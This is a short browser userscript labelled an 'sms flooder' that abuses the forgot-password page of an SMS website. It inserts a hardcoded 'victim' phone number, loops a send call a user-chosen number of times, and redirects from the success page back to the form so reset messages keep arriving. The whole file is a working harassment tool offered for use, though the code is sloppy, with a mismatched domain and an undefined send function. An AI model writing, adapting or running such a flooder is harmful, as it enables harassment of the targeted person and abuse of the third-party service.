// ==UserScript==
// @name          Anonymous SMSZE.COM sms flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*smsez.com/*
// ==/UserScript==

var victim=9633087782//Enter victims number here

if(document.location=="http://smsze.com/forgetpassword.php#"||document.location=="http://smsze.com/forgetpassword.php#")
{
document.getElementById('mobileno').value=victim;
void(0);
var reply= prompt("enter the number of messages you want to send", "")

for(i=1;i<reply;i++)
sendSMS(victim, reply);
}
if(document.location=='http://smsze.com/successpass.php#/'||document.location=='http://smsze.com/successpass.php#/')
document.location='http://smsze.com/forgetpassword.php#';